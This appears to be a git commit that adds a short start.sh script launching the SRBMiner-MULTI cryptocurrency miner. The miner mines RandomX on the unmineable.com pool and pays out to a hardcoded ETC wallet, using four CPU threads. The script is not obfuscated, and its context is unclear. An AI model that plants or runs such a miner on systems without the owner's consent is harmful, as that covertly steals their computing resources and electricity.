76693216186abe81e51d789beb3cad6b1cea6419
Anjlodd <jokerrdd@outlook.com>
2025-11-18 02:35:09 +0200

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+./SRBMiner-MULTI \
+--algorithm randomx \
+--pool rx.unmineable.com:3333 \
+--wallet ETC:0xe02cea6dc46e6a12f9baa11094f10ced5b6c3eab.LINUX#x \
+--cpu-threads 4 \
+--cpu-priority 5 \
+--log-file logs.txt
